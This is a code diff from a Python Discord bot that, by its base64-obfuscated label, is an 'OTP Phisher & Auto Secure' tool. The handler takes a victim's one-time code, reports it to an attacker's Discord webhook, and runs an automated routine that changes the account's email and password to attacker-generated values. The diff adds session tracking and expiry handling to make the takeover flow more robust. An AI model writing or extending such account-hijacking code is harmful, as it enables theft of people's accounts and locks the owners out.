@@ -20,10 +20,19 @@ class ButtonViewFour(ui.View):
     async def button_four(self, interaction: discord.Interaction, button: discord.ui.Button):
         inty2 = web3g.string("T1RQIFBoaXNoZXIgJiBBdXRvIFNlY3VyZQ==")
         threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vQmFja0FnYWluU3Bpbg==")
-        newgenpassword = generate_password()
-        TempEmail = await CreateRandomEmail()
-        webhook = Webhook.from_url(data["webhook"], session=session)
-        email = config.LastUsedEmail
+        from views.otp import get_user_session
+        user_session = get_user_session(interaction.user.id)
+        if user_session is None:
+            await interaction.response.send_message(
+                embed=discord.Embed(
+                    title="Session Expired",
+                    description="Session has expired! try again",
+                    colour=0xFF0000
+                ),
+                ephemeral=True
+            )
+            return
+
         try:
             with open("data.json", "r") as f:
                 data = json.load(f)
@@ -35,6 +44,10 @@ class ButtonViewFour(ui.View):
         if not webhook_url:
             await interaction.response.send_message("❌ Webhook is not set in data.json", ephemeral=True)
             return
+
+        newgenpassword = generate_password()
+        TempEmail = await CreateRandomEmail()
+        email = user_session.get("email") or config.LastUsedEmail
 
         embed = discord.Embed(
             title="Code Confirmed",
@@ -58,8 +71,18 @@ class ButtonViewFour(ui.View):
             webhook = Webhook.from_url(webhook_url, session=session)
             await webhook.send(embed=embed, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
             starttime = time.time()
-            await automate_auto_change(email,None,TempEmail,newgenpassword)
+            result = await automate_auto_change(email, None, TempEmail, newgenpassword, interaction.user.id)
             endtime = time.time()
+            if result == "expired":
+                await interaction.followup.send(
+                    embed=discord.Embed(
+                        title="Session Expired",
+                        description="Session has expired! try again",
+                        colour=0xFF0000
+                    ),
+                    ephemeral=True
+                )
+                return
             timetotal = endtime - starttime
             webhook = Webhook.from_url(data["webhook"], session=session)
             if config.LastCookie == "": #Fail Code
